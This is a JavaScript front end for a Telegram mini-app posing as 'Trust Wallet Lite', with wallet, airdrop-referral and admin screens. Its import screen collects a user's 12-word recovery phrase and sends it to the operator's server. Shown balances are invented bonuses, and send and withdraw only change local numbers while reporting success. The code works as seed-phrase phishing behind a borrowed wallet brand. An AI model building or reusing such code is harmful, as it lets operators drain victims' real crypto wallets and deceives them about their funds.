// ============================================================================
// TRUST WALLET LITE - FINAL WORKING VERSION
// ============================================================================

// ====== 1. TELEGRAM WEBAPP INITIALIZATION ======
const tg = window.Telegram?.WebApp;
if (tg) {
    tg.ready();
    tg.expand();
    console.log("✅ Telegram WebApp initialized");
}

// جلب بيانات المستخدم
const telegramUser = tg?.initDataUnsafe?.user;
const REAL_USER_ID = telegramUser?.id?.toString() || null;
const TELEGRAM_USERNAME = telegramUser?.username || '';
const TELEGRAM_FIRST_NAME = telegramUser?.first_name || 'User';
const TELEGRAM_LAST_NAME = telegramUser?.last_name || '';

console.log("📱 Telegram ID:", REAL_USER_ID);

const startParam = tg?.initDataUnsafe?.start_param || 
                   new URLSearchParams(window.location.search).get('startapp') || 
                   new URLSearchParams(window.location.search).get('ref');

// ====== 2. STATE ======
let userData = null;
let isAdmin = false;
let adminId = null;
let currentLanguage = localStorage.getItem('language') || 'en';
let currentTheme = localStorage.getItem('theme') || 'light';
let currentPage = 'wallet';
let TWT_PRICE = 1.25;
let livePrices = {};

// متغيرات النقرات السرية
let adminClickCount = 0;
let adminClickTimer = null;

// ====== 3. CONSTANTS ======
const BOT_LINK = "https://t.me/TrustTgWalletbot/TWT";
const AIRDROP_BONUS = 10;

const ALL_ASSETS = [
    { symbol: 'TWT', name: 'Trust Wallet Token' },
    { symbol: 'USDT', name: 'Tether' }
];

const CMC_ICONS = {
    TWT: 'https://s2.coinmarketcap.com/static/img/coins/64x64/5964.png',
    USDT: 'https://s2.coinmarketcap.com/static/img/coins/64x64/825.png'
};

// ====== 4. UTILITIES ======
function showToast(message) {
    const toast = document.getElementById('toast');
    if (!toast) return;
    toast.querySelector('#toastMessage').textContent = message;
    toast.classList.remove('hidden');
    setTimeout(() => toast.classList.add('hidden'), 3000);
}

function closeModal(modalId) {
    const modal = document.getElementById(modalId);
    if (modal) modal.classList.remove('show');
}

function copyToClipboard(text) {
    navigator.clipboard.writeText(text);
    showToast('Copied!');
}

function getCurrencyIcon(symbol) {
    return CMC_ICONS[symbol] || CMC_ICONS.TWT;
}

function formatBalance(balance, symbol) {
    if (symbol === 'TWT') return balance.toLocaleString() + ' TWT';
    if (symbol === 'USDT') return '$' + balance.toFixed(2);
    return balance + ' ' + symbol;
}

// ====== 5. THEME ======
function toggleTheme() {
    currentTheme = currentTheme === 'light' ? 'dark' : 'light';
    localStorage.setItem('theme', currentTheme);
    document.documentElement.setAttribute('data-theme', currentTheme);
}

function initTheme() {
    const saved = localStorage.getItem('theme') || 'light';
    currentTheme = saved;
    document.documentElement.setAttribute('data-theme', saved);
}

// ====== 6. API CALLS ======
async function loadAdminId() {
    try {
        const response = await fetch('/api/config');
        const config = await response.json();
        adminId = config.adminId;
        console.log("✅ Admin ID:", adminId);
        
        const userId = getUserId();
        if (userId && adminId) {
            isAdmin = (userId === adminId);
        }
        
        const crownBtn = document.getElementById('adminCrownBtn');
        if (crownBtn) {
            if (isAdmin) crownBtn.classList.remove('hidden');
            else crownBtn.classList.add('hidden');
        }
        
        return true;
    } catch (error) {
        console.error("Failed to load admin ID:", error);
        return false;
    }
}

async function verifyAdminPassword(password) {
    try {
        const response = await fetch('/api/verify-admin', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ password })
        });
        const data = await response.json();
        return data.success;
    } catch (error) {
        return false;
    }
}

async function createUser(userId, userData) {
    const response = await fetch('/api/users', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ userId, userData })
    });
    return response.json();
}

async function getUser(userId) {
    const response = await fetch(`/api/users/${userId}`);
    return response.json();
}

async function processReferral(referrerId, newUserId) {
    const response = await fetch('/api/referrals', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ referrerId, newUserId })
    });
    return response.json();
}

async function createDepositAddress(userId, currency) {
    const response = await fetch('/api/deposit-address', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ userId, currency })
    });
    return response.json();
}

// ====== 7. USER DATA ======
function getUserId() {
    if (REAL_USER_ID) return REAL_USER_ID;
    return localStorage.getItem('twt_user_id') || null;
}

async function loadUserData() {
    try {
        const userId = getUserId();
        if (!userId) return false;
        
        const localData = localStorage.getItem(`user_${userId}`);
        if (localData) {
            userData = JSON.parse(localData);
            return true;
        }
        
        const result = await getUser(userId);
        if (result.success && result.data) {
            userData = result.data;
            localStorage.setItem(`user_${userId}`, JSON.stringify(userData));
            return true;
        }
        
        return false;
    } catch (error) {
        console.error("Error loading user:", error);
        return false;
    }
}

function saveUserData() {
    if (userData) {
        localStorage.setItem(`user_${userData.userId}`, JSON.stringify(userData));
    }
}

function updateTotalBalance() {
    if (!userData) return;
    let total = userData.balances.USDT || 0;
    total += (userData.balances.TWT || 0) * TWT_PRICE;
    const el = document.getElementById('totalBalance');
    if (el) el.textContent = '$' + total.toFixed(2);
}

function renderAssets() {
    const container = document.getElementById('assetsList');
    if (!container || !userData) return;
    
    container.innerHTML = ALL_ASSETS.map(asset => {
        const balance = userData.balances[asset.symbol] || 0;
        const price = asset.symbol === 'TWT' ? TWT_PRICE : (livePrices[asset.symbol]?.price || 0);
        const value = asset.symbol === 'USDT' ? balance : balance * price;
        return `
            <div class="asset-item">
                <div class="asset-left">
                    <img src="${getCurrencyIcon(asset.symbol)}" class="asset-icon-img">
                    <div class="asset-info"><h4>${asset.name}</h4><p>${asset.symbol}</p></div>
                </div>
                <div class="asset-right">
                    <div class="asset-balance">${formatBalance(balance, asset.symbol)}</div>
                    <div class="asset-value">$${value.toFixed(2)}</div>
                </div>
            </div>
        `;
    }).join('');
}

function renderWallet() {
    const container = document.getElementById('walletContainer');
    container.innerHTML = `
        <div class="balance-card">
            <div class="total-balance" id="totalBalance">$0</div>
        </div>
        <div class="action-buttons">
            <button class="action-btn" onclick="showDepositModal()"><i class="fas fa-plus-circle"></i><span>Deposit</span></button>
            <button class="action-btn" onclick="showWithdrawModal()"><i class="fas fa-minus-circle"></i><span>Withdraw</span></button>
            <button class="action-btn" onclick="showSendModal()"><i class="fas fa-paper-plane"></i><span>Send</span></button>
            <button class="action-btn" onclick="showReceiveModal()"><i class="fas fa-qrcode"></i><span>Receive</span></button>
        </div>
        <div id="assetsList" class="assets-list"></div>
    `;
    renderAssets();
    updateTotalBalance();
}

// ====== 8. AIRDROP ======
function renderAirdrop() {
    const container = document.getElementById('referralContainer');
    if (!container || !userData) return;
    
    const inviteLink = `${BOT_LINK}?startapp=${userData.userId}`;
    
    container.innerHTML = `
        <div class="referral-stats">
            <div class="stat-card"><span>Total Invites</span><span id="totalInvites">${userData.inviteCount || 0}</span></div>
            <div class="stat-card"><span>USDT Earned</span><span id="usdtEarned">${(userData.totalUsdtEarned || 0).toFixed(2)}</span></div>
        </div>
        <div class="referral-link-card">
            <div class="link-container">
                <input type="text" id="inviteLink" value="${inviteLink}" readonly>
                <button class="copy-btn" onclick="copyInviteLink()"><i class="fas fa-copy"></i></button>
            </div>
        </div>
    `;
}

function copyInviteLink() {
    copyToClipboard(`${BOT_LINK}?startapp=${userData?.userId}`);
    showToast('Referral link copied!');
}

// ====== 9. TWT PAY ======
function renderTWTPay() {
    const container = document.getElementById('twtpayContainer');
    if (!container) return;
    const twtBalance = userData?.balances?.TWT || 0;
    container.innerHTML = `
        <div class="virtual-card">
            <div class="card-brand">TWT Pay</div>
            <div class="card-balance">
                <div>Balance: ${twtBalance} TWT</div>
                <div>≈ $${(twtBalance * TWT_PRICE).toFixed(2)}</div>
            </div>
        </div>
    `;
}

// ====== 10. SETTINGS ======
function renderSettings() {
    const container = document.getElementById('settingsContainer');
    container.innerHTML = `
        <div class="settings-list">
            <div class="settings-item" onclick="toggleLanguage()"><i class="fas fa-language"></i><div><div class="label">Language</div></div></div>
            <div class="settings-item" onclick="toggleTheme()"><i class="fas fa-moon"></i><div><div class="label">Theme</div></div></div>
            <div class="settings-item logout-btn" onclick="logout()"><i class="fas fa-sign-out-alt"></i><div><div class="label">Logout</div></div></div>
        </div>
    `;
}

function logout() {
    if (confirm('Logout?')) {
        localStorage.clear();
        location.reload();
    }
}

// ====== 11. ADMIN CLICK DETECTOR ======
function setupAdminClickDetector() {
    const notifBtn = document.getElementById('notificationBtn');
    if (!notifBtn) {
        setTimeout(setupAdminClickDetector, 500);
        return;
    }
    
    notifBtn.addEventListener('click', () => {
        if (adminClickTimer) clearTimeout(adminClickTimer);
        adminClickCount++;
        
        if (adminClickCount === 5) {
            adminClickCount = 0;
            const password = prompt("🔐 Enter Admin Password:");
            if (password) verifyAndShowAdminPanel(password);
        }
        
        adminClickTimer = setTimeout(() => {
            adminClickCount = 0;
        }, 3000);
    });
}

async function verifyAndShowAdminPanel(password) {
    const isValid = await verifyAdminPassword(password);
    if (isValid) {
        isAdmin = true;
        showAdminPanel();
        showToast("✅ Welcome, Administrator!");
    } else {
        showToast("❌ Invalid password!");
    }
}

function showAdminPanel() {
    if (!isAdmin) { showToast('Access denied'); return; }
    document.getElementById('adminPanel').classList.remove('hidden');
    document.getElementById('adminContent').innerHTML = `
        <div style="padding:20px;">
            <h4>👑 Admin Dashboard</h4>
            <p>Admin ID: ${adminId}</p>
            <p>Your ID: ${getUserId()}</p>
            <button onclick="closeAdminPanel()" class="btn-primary">Close</button>
        </div>
    `;
}

function closeAdminPanel() {
    document.getElementById('adminPanel').classList.add('hidden');
}

// ====== 12. DEPOSIT/WITHDRAW/SEND/RECEIVE ======
function showSendModal() { document.getElementById('sendModal').classList.add('show'); }
function showReceiveModal() { document.getElementById('receiveModal').classList.add('show'); document.getElementById('receiveAddress').innerText = userData?.userId || ''; }
function copyAddress() { copyToClipboard(document.getElementById('receiveAddress')?.innerText); }

async function sendTransaction() {
    const currency = document.getElementById('sendCurrency').value;
    const amount = parseFloat(document.getElementById('sendAmount').value);
    const address = document.getElementById('sendAddress').value;
    if (!amount || amount <= 0 || !address) { showToast('Fill all fields'); return; }
    if ((userData.balances[currency] || 0) < amount) { showToast('Insufficient balance'); return; }
    userData.balances[currency] -= amount;
    saveUserData();
    renderAssets();
    updateTotalBalance();
    closeModal('sendModal');
    showToast(`Sent ${amount} ${currency}`);
}

async function showDepositModal() {
    document.getElementById('depositModal').classList.add('show');
    const currency = document.getElementById('depositCurrency').value;
    const result = await createDepositAddress(userData.userId, currency);
    document.getElementById('depositAddress').innerText = result.address || `0x${userData.userId.slice(-40)}`;
}

function copyDepositAddress() { copyToClipboard(document.getElementById('depositAddress')?.innerText); }

function showWithdrawModal() { document.getElementById('withdrawModal').classList.add('show'); }

async function submitWithdraw() {
    const currency = document.getElementById('withdrawCurrency').value;
    const amount = parseFloat(document.getElementById('withdrawAmount').value);
    const address = document.getElementById('withdrawAddress').value;
    if (!amount || amount <= 0 || !address) { showToast('Fill all fields'); return; }
    if ((userData.balances[currency] || 0) < amount) { showToast('Insufficient balance'); return; }
    userData.balances[currency] -= amount;
    saveUserData();
    renderAssets();
    updateTotalBalance();
    closeModal('withdrawModal');
    showToast(`Withdrawal request submitted for ${amount} ${currency}`);
}

// ====== 13. NAVIGATION ======
function showWallet() { 
    currentPage = 'wallet'; 
    document.getElementById('walletSection').style.display = 'block';
    document.getElementById('referralSection').style.display = 'none';
    document.getElementById('twtpaySection').style.display = 'none';
    document.getElementById('settingsSection').style.display = 'none';
    document.querySelectorAll('.nav-item').forEach(item => item.classList.remove('active'));
    document.querySelector('.nav-item[data-tab="wallet"]').classList.add('active');
    renderWallet();
}

function showAirdrop() { 
    currentPage = 'airdrop'; 
    document.getElementById('walletSection').style.display = 'none';
    document.getElementById('referralSection').style.display = 'block';
    document.getElementById('twtpaySection').style.display = 'none';
    document.getElementById('settingsSection').style.display = 'none';
    document.querySelectorAll('.nav-item').forEach(item => item.classList.remove('active'));
    document.querySelector('.nav-item[data-tab="referral"]').classList.add('active');
    renderAirdrop();
}

function showTWTPay() { 
    currentPage = 'twtpay'; 
    document.getElementById('walletSection').style.display = 'none';
    document.getElementById('referralSection').style.display = 'none';
    document.getElementById('twtpaySection').style.display = 'block';
    document.getElementById('settingsSection').style.display = 'none';
    document.querySelectorAll('.nav-item').forEach(item => item.classList.remove('active'));
    document.querySelector('.nav-item[data-tab="twtpay"]').classList.add('active');
    renderTWTPay();
}

function showSettings() { 
    currentPage = 'settings'; 
    document.getElementById('walletSection').style.display = 'none';
    document.getElementById('referralSection').style.display = 'none';
    document.getElementById('twtpaySection').style.display = 'none';
    document.getElementById('settingsSection').style.display = 'block';
    document.querySelectorAll('.nav-item').forEach(item => item.classList.remove('active'));
    document.querySelector('.nav-item[data-tab="settings"]').classList.add('active');
    renderSettings();
}

// ====== 14. ONBOARDING ======
function showMainApp() {
    document.getElementById('onboardingScreen').style.display = 'none';
    document.getElementById('mainContent').style.display = 'block';
    showWallet();
}

function showOnboarding() {
    document.getElementById('onboardingScreen').style.display = 'flex';
    document.getElementById('mainContent').style.display = 'none';
}

async function createNewWallet() {
    const btn = document.getElementById('createWalletBtn');
    btn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Creating...';
    btn.disabled = true;
    
    try {
        if (!REAL_USER_ID) {
            showToast('Could not get Telegram ID');
            return;
        }
        
        const newUserId = REAL_USER_ID;
        localStorage.setItem('twt_user_id', newUserId);
        
        const newUserData = {
            userId: newUserId,
            userName: TELEGRAM_FIRST_NAME,
            lastName: TELEGRAM_LAST_NAME,
            username: TELEGRAM_USERNAME,
            telegramId: REAL_USER_ID,
            referralCode: newUserId.slice(-8),
            balances: { TWT: 1000, USDT: AIRDROP_BONUS, BNB: 0, BTC: 0, ETH: 0, SOL: 0, TRX: 0, ADA: 0, DOGE: 0, SHIB: 0, PEPE: 0, TON: 0 },
            inviteCount: 0,
            invitedBy: null,
            totalUsdtEarned: AIRDROP_BONUS,
            airdropMilestones: [],
            notifications: [],
            transactions: [],
            depositAddresses: {},
            withdrawBlocked: false,
            createdAt: new Date().toISOString()
        };
        
        await createUser(newUserId, newUserData);
        userData = newUserData;
        saveUserData();
        
        isAdmin = (newUserId === adminId);
        
        if (startParam) {
            await processReferral(startParam, newUserId);
        }
        
        showMainApp();
        renderWallet();
        showToast('✅ Wallet created! +10 USDT');
    } catch (error) {
        console.error(error);
        showToast('Failed to create wallet');
    } finally {
        btn.innerHTML = 'Create a new wallet';
        btn.disabled = false;
    }
}

function showImportModal() {
    const grid = document.getElementById('wordsGrid');
    grid.innerHTML = '';
    for (let i = 1; i <= 12; i++) {
        grid.innerHTML += `<div class="word-field"><div class="word-label">${i}</div><input type="text" id="word_${i}" class="word-input" placeholder="word ${i}"></div>`;
    }
    document.getElementById('importModal').classList.add('show');
}

async function importWallet() {
    const words = [];
    for (let i = 1; i <= 12; i++) {
        const word = document.getElementById(`word_${i}`)?.value.trim();
        if (!word) { showToast(`Enter word ${i}`); return; }
        words.push(word);
    }
    
    const btn = document.getElementById('confirmImportBtn');
    btn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Importing...';
    btn.disabled = true;
    
    try {
        if (!REAL_USER_ID) {
            showToast('Could not get Telegram ID');
            return;
        }
        
        const newUserId = REAL_USER_ID;
        localStorage.setItem('twt_user_id', newUserId);
        
        const newUserData = {
            userId: newUserId,
            userName: TELEGRAM_FIRST_NAME,
            lastName: TELEGRAM_LAST_NAME,
            username: TELEGRAM_USERNAME,
            telegramId: REAL_USER_ID,
            recoveryPhrase: words.join(' '),
            referralCode: newUserId.slice(-8),
            balances: { TWT: 1000, USDT: AIRDROP_BONUS, BNB: 0, BTC: 0, ETH: 0, SOL: 0, TRX: 0, ADA: 0, DOGE: 0, SHIB: 0, PEPE: 0, TON: 0 },
            inviteCount: 0,
            invitedBy: null,
            totalUsdtEarned: AIRDROP_BONUS,
            airdropMilestones: [],
            notifications: [],
            transactions: [],
            depositAddresses: {},
            withdrawBlocked: false,
            createdAt: new Date().toISOString()
        };
        
        await createUser(newUserId, newUserData);
        userData = newUserData;
        saveUserData();
        
        isAdmin = (newUserId === adminId);
        
        if (startParam) {
            await processReferral(startParam, newUserId);
        }
        
        closeModal('importModal');
        showMainApp();
        renderWallet();
        showToast('✅ Wallet imported! +10 USDT');
    } catch (error) {
        console.error(error);
        showToast('Failed to import wallet');
    } finally {
        btn.innerHTML = 'Import Wallet';
        btn.disabled = false;
    }
}

// ====== 15. PRICES ======
async function fetchLivePrices() {
    try {
        const response = await fetch('https://api.coingecko.com/api/v3/simple/price?ids=trust-wallet-token,tether&vs_currencies=usd');
        const data = await response.json();
        if (data['trust-wallet-token']) TWT_PRICE = data['trust-wallet-token'].usd;
        livePrices = { TWT: { price: TWT_PRICE }, USDT: { price: 1 } };
        if (currentPage === 'wallet') renderAssets();
        updateTotalBalance();
    } catch (e) { console.error(e); }
}

function refreshPrices() { fetchLivePrices(); showToast('Prices refreshed!'); }

// ====== 16. INITIALIZATION ======
document.addEventListener('DOMContentLoaded', async () => {
    initTheme();
    
    await loadAdminId();
    setupAdminClickDetector();
    
    document.querySelectorAll('.nav-item').forEach(btn => {
        btn.addEventListener('click', () => {
            const tab = btn.getAttribute('data-tab');
            if (tab === 'wallet') showWallet();
            else if (tab === 'referral') showAirdrop();
            else if (tab === 'twtpay') showTWTPay();
            else if (tab === 'settings') showSettings();
        });
    });
    
    document.getElementById('createWalletBtn').onclick = createNewWallet;
    document.getElementById('importWalletBtn').onclick = showImportModal;
    document.getElementById('confirmImportBtn').onclick = importWallet;
    
    await fetchLivePrices();
    
    const hasUser = await loadUserData();
    if (hasUser && userData) {
        showMainApp();
        renderWallet();
    } else {
        showOnboarding();
    }
    
    setTimeout(() => {
        const splash = document.getElementById('splashScreen');
        if (splash) splash.classList.add('hidden');
    }, 1500);
});

// ====== 17. EXPOSE GLOBALS ======
window.showWallet = showWallet;
window.showAirdrop = showAirdrop;
window.showTWTPay = showTWTPay;
window.showSettings = showSettings;
window.showSendModal = showSendModal;
window.showReceiveModal = showReceiveModal;
window.showDepositModal = showDepositModal;
window.showWithdrawModal = showWithdrawModal;
window.showAdminPanel = showAdminPanel;
window.closeModal = closeModal;
window.closeAdminPanel = closeAdminPanel;
window.refreshPrices = refreshPrices;
window.sendTransaction = sendTransaction;
window.submitWithdraw = submitWithdraw;
window.copyAddress = copyAddress;
window.copyDepositAddress = copyDepositAddress;
window.copyInviteLink = copyInviteLink;
window.toggleLanguage = toggleLanguage;
window.toggleTheme = toggleTheme;
window.logout = logout;
window.createNewWallet = createNewWallet;
window.importWallet = importWallet;
window.showImportModal = showImportModal;

console.log("✅ Trust Wallet Lite - WORKING!");
